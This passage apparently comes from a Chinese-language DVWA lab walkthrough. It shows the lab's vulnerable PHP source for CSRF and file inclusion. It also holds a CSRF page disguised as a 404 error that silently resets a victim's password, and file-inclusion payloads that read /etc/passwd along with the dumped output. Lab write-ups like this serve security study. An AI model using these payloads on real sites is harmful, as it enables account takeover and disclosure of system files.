class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$insert</span> ) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>( <span class=\"string\">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) : ((<span class=\"variable\">$___mysqli_res</span> = mysqli_connect_error()) ? <span class=\"variable\">$___mysqli_res</span> : <span class=\"literal\">false</span>)) . <span class=\"string\">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Feedback for the user</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Issue with passwords matching</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    ((is_null(<span class=\"variable\">$___mysqli_res</span> = mysqli_close(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]))) ? <span class=\"literal\">false</span> : <span class=\"variable\">$___mysqli_res</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Generate Anti-CSRF token</span></span><br><span class=\"line\">generateSessionToken();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Medium CSRF Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Checks to see where the request came from</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( stripos( <span class=\"variable\">$_SERVER</span>[ <span class=\"string\">&#x27;HTTP_REFERER&#x27;</span> ] ,<span class=\"variable\">$_SERVER</span>[ <span class=\"string\">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class=\"literal\">false</span> ) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Get input</span></span><br><span class=\"line\">        <span class=\"variable\">$pass_new</span>  = <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;password_new&#x27;</span> ];</span><br><span class=\"line\">        <span class=\"variable\">$pass_conf</span> = <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;password_conf&#x27;</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Do the passwords match?</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>( <span class=\"variable\">$pass_new</span> == <span class=\"variable\">$pass_conf</span> ) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// They do!</span></span><br><span class=\"line\">            <span class=\"variable\">$pass_new</span> = ((<span class=\"keyword\">isset</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$pass_new</span> ) : ((trigger_error(<span class=\"string\">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class=\"string\">&quot;&quot;</span> : <span class=\"string\">&quot;&quot;</span>));</span><br><span class=\"line\">            <span class=\"variable\">$pass_new</span> = md5( <span class=\"variable\">$pass_new</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">// Update the database</span></span><br><span class=\"line\">            <span class=\"variable\">$insert</span> = <span class=\"string\">&quot;UPDATE `users` SET password = &#x27;<span class=\"subst\">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class=\"string\">&quot;&#x27;;&quot;</span>;</span><br><span class=\"line\">            <span class=\"variable\">$result</span> = mysqli_query(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$insert</span> ) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>( <span class=\"string\">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) : ((<span class=\"variable\">$___mysqli_res</span> = mysqli_connect_error()) ? <span class=\"variable\">$___mysqli_res</span> : <span class=\"literal\">false</span>)) . <span class=\"string\">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">// Feedback for the user</span></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">// Issue with passwords matching</span></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Didn&#x27;t come from a trusted source</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    ((is_null(<span class=\"variable\">$___mysqli_res</span> = mysqli_close(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]))) ? <span class=\"literal\">false</span> : <span class=\"variable\">$___mysqli_res</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Low CSRF Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Get input</span></span><br><span class=\"line\">    <span class=\"variable\">$pass_new</span>  = <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;password_new&#x27;</span> ];</span><br><span class=\"line\">    <span class=\"variable\">$pass_conf</span> = <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;password_conf&#x27;</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Do the passwords match?</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( <span class=\"variable\">$pass_new</span> == <span class=\"variable\">$pass_conf</span> ) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// They do!</span></span><br><span class=\"line\">        <span class=\"variable\">$pass_new</span> = ((<span class=\"keyword\">isset</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$pass_new</span> ) : ((trigger_error(<span class=\"string\">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class=\"string\">&quot;&quot;</span> : <span class=\"string\">&quot;&quot;</span>));</span><br><span class=\"line\">        <span class=\"variable\">$pass_new</span> = md5( <span class=\"variable\">$pass_new</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Update the database</span></span><br><span class=\"line\">        <span class=\"variable\">$insert</span> = <span class=\"string\">&quot;UPDATE `users` SET password = &#x27;<span class=\"subst\">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class=\"string\">&quot;&#x27;;&quot;</span>;</span><br><span class=\"line\">        <span class=\"variable\">$result</span> = mysqli_query(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$insert</span> ) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>( <span class=\"string\">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) : ((<span class=\"variable\">$___mysqli_res</span> = mysqli_connect_error()) ? <span class=\"variable\">$___mysqli_res</span> : <span class=\"literal\">false</span>)) . <span class=\"string\">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Feedback for the user</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Issue with passwords matching</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    ((is_null(<span class=\"variable\">$___mysqli_res</span> = mysqli_close(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]))) ? <span class=\"literal\">false</span> : <span class=\"variable\">$___mysqli_res</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"low-3\"><a class=\"markdownIt-Anchor\" href=\"#low-3\">#</a> Low</h3>\n<ul>\n<li>做个网页</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>是兄弟就来砍我<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">center</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">&quot;http://192.168.23.133/dvwa/vulnerabilities/csrf/&quot;</span> <span class=\"attr\">method</span>=<span class=\"string\">&quot;get&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;password_new&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;123&quot;</span>/&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;password_conf&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;123&quot;</span>/&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;Change&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;Change&quot;</span>/&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;submit&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;是兄弟就来砍我&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">p</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;font-size:40px;&quot;</span>&gt;</span>404<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">p</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;font-size:20px;&quot;</span>&gt;</span>Page not Found!<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">center</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>包信息</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change HTTP/1.1</span><br><span class=\"line\">Host: 192.168.23.133</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class=\"line\">Accept-Language: en-US,en;q=0.5</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Referer: http://192.168.23.133/dvwa/vulnerabilities/csrf/</span><br><span class=\"line\">Cookie: security=medium; PHPSESSID=otpvh75rdm983qnfc0scstgns0</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>\n<h3 id=\"medium-3\"><a class=\"markdownIt-Anchor\" href=\"#medium-3\">#</a> Medium</h3>\n<ul>\n<li>Low 方法失效，对比正常请求的包，发现包中添加了</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Referer: http://192.168.23.133/dvwa/vulnerabilities/csrf/</span><br></pre></td></tr></table></figure>\n<p>解决方案是将 csrf 网页部署在目标服务器 IP 作为的路径下。</p>\n<h3 id=\"high-3\"><a class=\"markdownIt-Anchor\" href=\"#high-3\">#</a> High</h3>\n<ul>\n<li>需要配合 XSS 攻击</li>\n</ul>\n<h2 id=\"file-inclusion\"><a class=\"markdownIt-Anchor\" href=\"#file-inclusion\">#</a> File Inclusion</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//File Inclusion</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//Impossible File Inclusion Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// The page we wish to display</span></span><br><span class=\"line\"><span class=\"variable\">$file</span> = <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;page&#x27;</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Only allow include.php or file&#123;1..3&#125;.php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"variable\">$file</span> != <span class=\"string\">&quot;include.php&quot;</span> &amp;&amp; <span class=\"variable\">$file</span> != <span class=\"string\">&quot;file1.php&quot;</span> &amp;&amp; <span class=\"variable\">$file</span> != <span class=\"string\">&quot;file2.php&quot;</span> &amp;&amp; <span class=\"variable\">$file</span> != <span class=\"string\">&quot;file3.php&quot;</span> ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// This isn&#x27;t the page we want!</span></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;ERROR: File not found!&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//High File Inclusion Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// The page we wish to display</span></span><br><span class=\"line\"><span class=\"variable\">$file</span> = <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;page&#x27;</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Input validation</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>( !fnmatch( <span class=\"string\">&quot;file*&quot;</span>, <span class=\"variable\">$file</span> ) &amp;&amp; <span class=\"variable\">$file</span> != <span class=\"string\">&quot;include.php&quot;</span> ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// This isn&#x27;t the page we want!</span></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;ERROR: File not found!&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//Medium File Inclusion Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// The page we wish to display</span></span><br><span class=\"line\"><span class=\"variable\">$file</span> = <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;page&#x27;</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Input validation</span></span><br><span class=\"line\"><span class=\"variable\">$file</span> = str_replace( <span class=\"keyword\">array</span>( <span class=\"string\">&quot;http://&quot;</span>, <span class=\"string\">&quot;https://&quot;</span> ), <span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$file</span> );</span><br><span class=\"line\"><span class=\"variable\">$file</span> = str_replace( <span class=\"keyword\">array</span>( <span class=\"string\">&quot;../&quot;</span>, <span class=\"string\">&quot;..\\&quot;&quot;</span> ), <span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$file</span> );</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//Low File Inclusion Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// The page we wish to display</span></span><br><span class=\"line\"><span class=\"variable\">$file</span> = <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;page&#x27;</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"low-4\"><a class=\"markdownIt-Anchor\" href=\"#low-4\">#</a> Low</h3>\n<ul>\n<li>GET 方法传参，直接修改网址，查看 /etc/passwd</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?page=/etc/passwd</span><br><span class=\"line\"></span><br><span class=\"line\">root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin games:x:12:100:games:/usr/games:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:99:99:Nobody:/:/sbin/nologin systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin dbus:x:81:81:System message bus:/:/sbin/nologin polkitd:x:999:998:User for polkitd:/:/sbin/nologin sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin postfix:x:89:89::/var/spool/postfix:/sbin/nologin chrony:x:998:996::/var/lib/chrony:/sbin/nologin mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin dockerroot:x:997:994:Docker User:/var/lib/docker:/sbin/nologin </span><br></pre></td></tr></table></figure>\n<h3 id=\"medium-4\"><a class=\"markdownIt-Anchor\" href=\"#medium-4\">#</a> Medium</h3>\n<ul>\n<li>\n<p>过滤了 “http://”, “https://”，“…/&quot;,&quot;…\\&quot;</p>\n</li>\n<li>\n<p>可以构造 &quot;httphttp://😕/&quot; 异形路径</p>\n</li>\n<li>\n<p>同 Low 等级</p>\n</li>\n</ul>\n<h3 id=\"high-4\"><a class=\"markdownIt-Anchor\" href=\"#high-4\">#</a> High</h3>\n<ul>\n<li>\n<p>加入黑名单机制，参数只能以 file 开头</p>\n</li>\n<li>\n<p>构造参数</p>\n</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?page=file:///etc/passwd</span><br></pre></td></tr></table></figure>\n<ul>\n<li>使用 file 协议访问本地文件</li>\n</ul>\n<h2 id=\"file-upload\"><a class=\"markdownIt-Anchor\" href=\"#file-upload\">#</a> File Upload</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span 